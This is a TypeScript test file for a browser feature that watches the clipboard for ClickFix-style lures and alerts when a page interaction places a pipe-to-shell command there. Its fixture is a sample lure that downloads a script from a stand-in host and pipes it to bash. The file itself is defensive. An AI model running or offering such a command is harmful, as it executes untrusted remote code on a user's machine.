import { describe, expect, it, vi } from 'vitest';

import { CLIPBOARD_POLL_MS, createClipboardWatch, type ClipboardWatchDeps } from './clipboard-watch';

const LURE = 'curl -fsSL https://verify-human.example/check.sh | bash';

function harness(overrides: Partial<ClipboardWatchDeps> = {}) {
  const state = { clipboard: 'hello', active: true, interaction: { tabId: 't1', origin: 'https://captcha.example' } as { tabId: string; origin: string } | null };
  const onHit = vi.fn();
  const reads = vi.fn(() => state.clipboard);
  const watch = createClipboardWatch({
    readText: reads,
    isActive: () => state.active,
    recentPageInteraction: () => state.interaction,
    onHit,
    ...overrides,
  });
  return { state, onHit, reads, watch };
}

describe('the ClickFix clipboard watch', () => {
  it('raises the bar within one poll when a page interaction puts a pipe-to-shell line on the clipboard', () => {
    const { state, onHit, watch } = harness();
    watch.tick(); // baseline
    state.clipboard = LURE;
    watch.tick();
    expect(onHit).toHaveBeenCalledWith({
      tabId: 't1',
      origin: 'https://captcha.example',
      match: expect.objectContaining({ reason: 'pipe-to-shell' }),
      preview: LURE,
    });
  });

  it('never alerts on the first read: a change made while unfocused happened elsewhere', () => {
    const { state, onHit, watch } = harness();
    state.clipboard = LURE;
    watch.tick();
    expect(onHit).not.toHaveBeenCalled();
  });

  it('does not read the clipboard at all while no Browser window is focused', () => {
    const { state, reads, onHit, watch } = harness();
    state.active = false;
    watch.tick();
    state.clipboard = LURE;
    watch.tick();
    expect(reads).not.toHaveBeenCalled();
    state.active = true;
    watch.tick(); // a fresh baseline after refocus
    expect(onHit).not.toHaveBeenCalled();
  });

  it('ignores a command copied without a page interaction, and harmless text with one', () => {
    const { state, onHit, watch } = harness();
    watch.tick();
    state.interaction = null;
    state.clipboard = LURE;
    watch.tick();
    state.interaction = { tabId: 't1', origin: 'https://docs.example' };
    state.clipboard = 'npm install left-pad';
    watch.tick();
    expect(onHit).not.toHaveBeenCalled();
  });

  it('does not alert twice for the same clipboard', () => {
    const { state, onHit, watch } = harness();
    watch.tick();
    state.clipboard = LURE;
    watch.tick();
    watch.tick();
    expect(onHit).toHaveBeenCalledTimes(1);
  });

  it('polls at 1 Hz and stops cleanly', () => {
    const setInterval = vi.fn(() => 7);
    const clearInterval = vi.fn();
    const { watch } = harness({ setInterval, clearInterval });
    watch.start();
    watch.start();
    expect(setInterval).toHaveBeenCalledTimes(1);
    expect(setInterval).toHaveBeenCalledWith(expect.any(Function), CLIPBOARD_POLL_MS);
    watch.stop();
    expect(clearInterval).toHaveBeenCalledWith(7);
  });
});
